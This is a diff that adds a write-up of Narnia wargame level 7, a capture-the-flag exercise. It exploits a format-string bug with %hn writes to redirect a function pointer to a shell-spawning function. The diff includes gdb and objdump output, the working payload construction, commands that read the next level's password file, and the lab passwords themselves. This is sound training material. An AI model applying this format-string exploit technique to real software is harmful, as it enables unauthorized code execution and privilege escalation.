@@ -341,3 +341,47 @@ Verification: each password was accepted by logging in as the next level's accou
 - **Verification:** logged in as `narnia7` with this password (`whoami` → `narnia7`).
 - **Recording:** `recordings/narnia/L6.cast`
 
+## Level 7 → narnia8
+- **Account:** `narnia7`, password `Hwsfol90tt`.
+- **Goal:** `vuln()` declares `char buffer[128]; int (*ptrf)();`, sets `ptrf = goodfunction`, prints `goodfunction()`, `hackedfunction()` and `&ptrf`, then does `snprintf(buffer, sizeof buffer, format)` where `format` is `argv[1]`, and finally `return ptrf();`. If `ptrf` points at `hackedfunction`, that function does `setreuid(geteuid(),geteuid())` and `system("/bin/sh")`.
+- **Technique and why it works:** a format-string bug combined with a function-pointer overwrite. `ptrf` lives at `ebp-0x84`, *below* `buffer` at `ebp-0x80`, so a buffer overflow cannot reach it; the only way is `%n`. The program helpfully prints `hackedfunction`'s address and the address of `ptrf`, so we do not have to guess: we probe with an argument of the same length and the same empty environment, read both addresses from the output, then build the real payload. `snprintf`'s varargs start at `esp+12`: with an empty environment vararg1 is `ptrf`'s current value, vararg2 is `buffer[0..3]` and vararg3 is `buffer[8..11]`. The format string itself (`argv[1]`) lives far up the stack at **arg index 152** — measured live, and stable across runs because the argv/env layout is fixed with an empty environment. So we put the two target addresses in the format string's first 8 bytes, where they are varargs 152 and 153, and write the two 16-bit halves of `hackedfunction` with `%152$hn` and `%153$hn`. `snprintf` stops writing at 128 bytes, but `%n` still fires with the full count, so the large `%<count>c` widths work.
+
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the source.** `cat /narnia/narnia7.c`: `char buffer[128]; int (*ptrf)();`, `snprintf(buffer, sizeof buffer, format);`, `return ptrf();`, and `hackedfunction()` runs a shell.
+2. **Locate the variables.** `objdump -d --no-show-raw-insn /narnia/narnia7 | sed -n '/<vuln>:/,/ret/p'`:
+   ```
+   movl $0x80492ea,-0x84(%ebp)    # ptrf at ebp-0x84, = goodfunction
+   lea -0x80(%ebp),%eax           # buffer at ebp-0x80
+   push 0x8(%ebp); push $0x80; push %eax; call snprintf@plt
+   mov -0x84(%ebp),%eax; call *%eax
+   ```
+   `ptrf` (ebp-0x84) is 4 bytes *below* `buffer` (ebp-0x80), so writing forward into `buffer` never reaches it.
+3. **Check the layout in gdb.** At the `snprintf` call:
+   ```
+   gdb -batch -ex 'b *0x8049298' -ex 'run AAAA' -ex 'p/x $esp' -ex 'x/4wx $esp' -ex 'p/x $ebp-0x84' -ex 'p/x $ebp-0x80' -ex 'p/x *(char**)($esp+8)' /narnia/narnia7
+   # esp = 0xffffdd6c
+   # 0xffffdd6c: 0xffffdd7c (buffer)  0x00000080 (size)  0xffffdfd4 (format)  0x080492ea (ptrf value)
+   # $ebp-0x84 = 0xffffdd68 (ptrf)   $ebp-0x80 = 0xffffdd7c (buffer)
+   ```
+   So vararg1 = `0x080492ea` (ptrf's value), vararg2 = `buffer[0..3]` (zeros), vararg3 = `buffer[8..11]`.
+4. **Measure where the format string's own bytes live.** The format string is at `0xffffdfd4`, which is `0x268` bytes above `esp+12`; `0x268 / 4 = 154` in gdb's layout. In the real run (empty environment) the working index is **152** — found by sweeping: for each candidate `k`, probe `&ptrf` with an argument of exactly the payload's length (the stack shifts with argument length!), then run the real two-write payload and look for `Way to go`. `k=152` produced it.
+5. **Understand the two-write payload** (`L7.py`):
+   ```
+   fmt = pack("<I", ptrf+2) + pack("<I", ptrf) \
+       + b"%" + str(hi-8) + b"c%152$hn" + b"%" + str(lo-hi) + b"c%153$hn"
+   ```
+   - `fmt[0..3] = &ptrf+2` is vararg 152; `fmt[4..7] = &ptrf` is vararg 153.
+   - The 8 address bytes are printed first (count 8), then `%<hi-8>c` pads to `hi`, `%152$hn` writes `hi` into the high half of `ptrf`; `%<lo-hi>c` pads to `lo`, `%153$hn` writes `lo` into the low half.
+   - `hi = 0x0804`, `lo = 0x930f` for `hackedfunction = 0x804930f`, and `hi < lo`, so a single pass suffices.
+6. **Run it.** `python3 /tmp/e_narnia7.py` prints `hackedfunction = 0x804930f`, `&ptrf = 0xffffdd68`, then the format string; the binary prints `Way to go!!!!` and drops into a shell.
+7. **Use the shell.**
+   ```
+   id                        # uid=14008(narnia8) gid=14007(narnia7)
+   cat /etc/narnia_pass/narnia8
+   ```
+- **Password for narnia8:** `aToTvI5BYB`
+- **Verification:** logged in as `narnia8` with this password (`whoami` → `narnia8`).
+- **Recording:** `recordings/narnia/L7.cast`
+
+**Narnia status:** levels 0–7 solved; the game continues with levels 8 and 9 (narnia8/narnia9 accounts exist and their password files are readable by the next level), which are covered in the next section.
+
